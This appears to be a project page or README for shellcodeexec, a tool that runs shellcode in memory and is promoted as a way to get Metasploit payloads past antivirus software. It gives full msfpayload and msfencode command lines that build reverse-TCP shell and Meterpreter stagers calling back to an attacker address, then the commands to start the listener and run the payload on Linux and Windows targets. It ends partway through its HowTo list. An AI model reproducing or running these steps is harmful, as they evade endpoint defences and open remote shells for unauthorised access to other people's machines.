        <h2>Background</h2>

<p>Most of the shellcode launchers out there, including proof of concepts part of many "security" books, detail how to allocate a memory page as readable/writable/executable on POSIX systems, copy over your shellcode and execute it. This works just fine. However, it is limited to POSIX, does not necessarily consider 64-bit architecture and Windows systems.</p>

<h2>Description</h2>

<p>shellcodeexec is an open source script to execute in memory a sequence of opcodes.</p>

<p>This script and the relevant project files (Makefile and Visual Studio files) allow you to compile the tool once then run your shellcode across different architectures and operating systems.</p>

<p>Moreover, it solves a common real world issue: the target system's anti virus software blocking a Metasploit-generated payload stager (either EXE of ELF). Take for instance the following command line:</p>

<pre><code>$ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=process LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/shikata_ga_nai -o /tmp/payload.exe -t exe
</code></pre>

<p>This generates a Metasploit payload stager, payload.exe, that as soon as it lands on the AV-protected target system is recognized as malicious and potentially blocked (depending on the on-access scan settings) by many anti virus products. At the time of writing this text, 21 out 41 anti viruses detect it as malicious - <a href="http://goo.gl/HTw7o">http://goo.gl/HTw7o</a>. By encoding it multiple times with msfencode, less AV softwares detect it, still a lot.</p>

<p>I have been surfing the Net and found some interesting tutorials and guides about packing, compressing, obfuscating and applying IDA-foo to portable executables et similar in order to narrow down the number of AV products that can detect it as a malicious file. This is all interesting, but does not stop few hard-to-die anti viruses to detect your backdoor.</p>

<p>So the question is, how cool would it be to have a final solution to avoid all this hassle? This is exactly where this tool comes into play!</p>

<h2>Features</h2>

<p>shellcodeexec:</p>

<ul>
<li>Can be compiled and works on POSIX (Linux/Unices) and Windows systems.</li>
<li>Can be compiled and works on 32-bit and 64-bit architectures.</li>
<li>As far as I know, no AV detect it as malicious.</li>
<li>Works in DEP/NX-enabled environments: it allocates the memory page where it stores the shellcode as +rwx - Readable Writable and eXecutable.</li>
<li>It supports alphanumeric encoded payloads: you can pipe your binary-encoded shellcode (generated for instance with Metasploit's msfpayload) to Metasploit's msfencode to encode it with the alpha_mixed encoder. Set the BufferRegister variable to EAX registry where the address in memory of the shellcode will be stored, to avoid get_pc() binary stub to be prepended to the shellcode.</li>
<li>Spawns a new thread where the shellcode is executed in a structure exception handler (SEH) so that if you wrap shellcodeexec into your own executable, it avoids the whole process to crash in case of unexpected behaviours.</li>
</ul><h2>HowTo</h2>

<ol>
<li>Generate a Metasploit shellcode and encode it with the alphanumeric encoder. For example for a Linux target:
<pre>
$ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
</pre>
Or for a Windows target:
<pre>
$ msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
</pre>
</li>
<li>Execute the Metasploit multi/handler listener on your machine. For example for a Linux target:
<pre>
$ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
</pre>
Or for a Windows target:
<pre>
$ msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
</pre>
</li>
<li>Execute the alphanumeric-encoded shellcode with this tool. For example on the Linux target:
<pre>
$ ./shellcodeexec &lt;msfencode's alphanumeric-encoded payload&gt;
</pre>
Or, on the Windows target:
<pre>
C:\WINDOWS\Temp&gt;shellcodeexec.exe &lt;msfencode's alphanumeric-encoded payload&gt;
</pre>
</li>
